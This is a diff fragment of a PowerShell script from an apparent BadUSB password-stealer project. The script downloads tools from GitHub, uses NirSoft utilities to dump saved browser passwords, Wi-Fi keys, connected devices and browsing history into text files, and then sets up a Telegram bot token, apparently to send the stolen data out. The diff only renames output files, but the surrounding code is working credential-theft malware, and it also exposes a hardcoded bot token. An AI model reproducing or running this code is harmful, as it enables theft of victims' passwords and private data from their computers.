@@ -23,8 +23,8 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 # Execute tools to gather data
 .\WebBrowserPassView.exe /stext passwords.txt
 .\WirelessKeyView.exe /stext wifi.txt
-.\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt # Create the file for connected devices
-.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt # Create the file for browser history
+.\WNetWatcher.exe /stext connected_devices.txt # Create the file for connected devices
+.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt # Create the file for browser history 
 # Wait for the files to be fully written
 while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt")) {
     Start-Sleep -Seconds 1
@@ -41,8 +41,7 @@ while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path 
 }
 
 
-.\WNetWatcher.exe /stext connected_devices.txt # Create the file for connected devices
-.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt # Create the file for browser history 
+
 
 # Telegram configuration
 $token = "7303458194:AAGpVa4Afhhs9-Ktoc2R0vORdkv2IkmQ7qI"
